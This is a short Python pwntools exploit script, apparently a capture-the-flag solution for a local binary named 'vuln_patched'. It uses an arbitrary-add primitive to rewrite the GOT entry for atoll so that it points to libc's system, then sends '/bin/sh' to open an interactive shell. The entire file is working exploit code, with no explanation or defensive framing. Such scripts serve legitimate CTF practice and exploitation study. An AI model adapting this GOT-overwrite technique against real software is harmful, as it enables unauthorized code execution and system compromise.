from pwn import *

chal = ELF('./vuln_patched')
libc = ELF('./libc.so.6')

gdbscript='''
b main
c
'''

context.binary = chal
context.terminal = ["tmux", "splitw", "-h"]

conn = process([chal.path])
#conn = gdb.debug([chal.path], gdbscript)

def exit():
    conn.sendlineafter(b'? ', b'1337')
    conn.sendlineafter(b'? ', b'')

def add(offset, val):
    offset = str(offset).encode()
    val = str(val).encode()
    
    # `fgets` reads 0x10 - 1 bytes.
    assert len(offset) < 0x10
    assert len(val) < 0x10

    conn.sendlineafter(b'? ', offset)
    conn.sendlineafter(b'? ', val)

def main():
    offset = chal.got.atoll - chal.sym.buf
    val = libc.sym.system - libc.sym.atoll
    add(offset , val)
    conn.sendlineafter(b'? ', b'/bin/sh\0')
    conn.interactive()

if __name__ == '__main__':
    main()